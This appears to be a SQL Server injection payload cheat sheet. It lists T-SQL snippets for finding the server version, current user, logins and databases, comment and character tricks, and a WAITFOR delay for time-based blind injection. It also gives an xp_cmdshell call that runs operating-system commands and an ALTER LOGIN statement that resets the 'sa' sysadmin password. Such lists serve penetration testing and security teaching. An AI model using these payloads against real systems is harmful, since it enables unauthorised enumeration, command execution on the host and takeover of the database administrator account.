SQL Server Payload
=====================================

- Version 
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Current User
    - ``SELECT user_name()``
    - ``SELECT system_user``
    - ``SELECT user``
    - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- List User
    - ``SELECT name FROM master..syslogins``
- Current Database
    - ``SELECT DB_NAME()``
- List Database
    - ``SELECT name FROM master..sysdatabases``
- Command
    - ``EXEC xp_cmdshell 'net user'``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
    - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
